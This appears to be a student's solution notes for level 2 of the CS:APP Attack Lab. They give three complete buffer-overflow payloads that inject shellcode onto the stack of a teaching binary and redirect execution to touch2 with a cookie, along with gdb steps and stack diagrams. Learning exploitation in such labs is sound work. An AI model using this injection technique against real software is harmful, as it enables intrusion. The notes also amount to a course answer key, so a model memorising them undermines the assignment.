@@ -1,0 +1,129 @@
+/*
+This time you need to call touch2(). However, as touch2 requires argument to
+to be passed, you also need to execute other code, i.e., the code you inject
+onto the stack.
+The input string should contains the address of your injected code. The inject
+code should do: move cookie value to %rdi, and then call touch2() function.
+
+You can set the breakpoint at getbuf(), so that you know the address of the
+top of the stack, and calculate the address of the code to be injected.
+
+The usage of "gcc -c" and "objdump -d":
+1. Write assembly code command into level2_CI.s;
+2. Use "gcc -c level2_CI.s" to generate object file level2_CI.o;
+3. Use "objdump -d level2_CI.o > disasembled.s" to get byte representation.
+This can be done with "generate.sh".
+
+---------------- MOST IMPORTANT TECHNIQUE/PITFALL -----------------------------
+1. Object code is executed from lower address to higher address! From bottom
+to top, not from top to bottom on the stack diagram! This is against the
+normal way of reading source code!
+
+2. When you use assembly code from objdump, you do not need to reverse the order.
+But when you enter an address your self, you need to do so.
+
+It really take some time for me to realize this by reading:
+https://chuanleiguo.com/2017/07/09/csapp_attacklab/
+------------------------------------------------------------------------------
+
+1. Stack pointer
+Before entering getbuf():
+(gdb) print /x $rsp
+$1 = 0x5561dca0
+
+2. Instruction to be inserted
+Suppose the cookie value is stored starting from 0x5561dca8.
+
+48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+68 ec 17 40 00       	pushq  $0x4017ec
+c3                   	retq
+
+./hex2raw < level2/level2_CI_solution.txt | ./ctarget -q
+*/
+
+/*
+Method 1: Inject code above the return address.
+
+The stack after allocating space in getbuf:
+---------------------------
+|ec 17 40 00 c3 00 00 00  | 0x5561dcb0
+---------------------------
+|48 c7 c7 fa 97 b9 59 68  | 0x5561dca8
+---------------------------
+|00 00 00 00 55 61 dc a8  | 0x5561dca0, return address after calling Gets()
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 dc 61 55 00 00 00 00
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+*/
+
+/* Method 2: Inject code below the return address.
+
+The stack after allocating space in getbuf:
+---------------------------
+|00 00 00 00 55 61 dc 78  | 0x5561dca0, return address after calling Gets()
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|ec 17 40 00 c3 00 00 00  |
+---------------------------
+|48 c7 c7 fa 97 b9 59 68  | 0x5561dc78
+---------------------------
+
+
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+*/
+
+/* Method 3: Do not use "push" and "ret"
+48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+b8 ec 17 40 00       	mov    $0x4017ec,%eax
+ff e0                	jmpq   *%rax
+
+The stack after allocating space in getbuf:
+---------------------------
+|00 00 00 00 55 61 dc 78  | 0x5561dca0, return address after calling Gets()
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|ec 17 40 00 ff e0 00 00  |
+---------------------------
+|48 c7 c7 fa 97 b9 59 b8  | 0x5561dc78
+---------------------------
+
+
+48 c7 c7 fa 97 b9 59 b8
+ec 17 40 00 ff e0 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+*/
